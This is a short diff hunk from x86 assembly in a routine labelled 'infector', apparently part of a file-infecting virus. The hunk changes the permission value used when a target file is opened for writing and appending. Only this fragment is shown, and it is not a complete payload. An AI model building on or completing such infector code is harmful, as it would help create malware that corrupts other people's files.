@@ -90,7 +90,7 @@ infector:
     mov     eax, 5
     mov     ebx, [ebp + 8]
     mov     ecx, 1025       ; write and append
-    mov     edx, 1411       ; all permissions
+    mov     edx, 511        ; all permissions
     int     0x80
 
     mov     [ebp - 4], eax
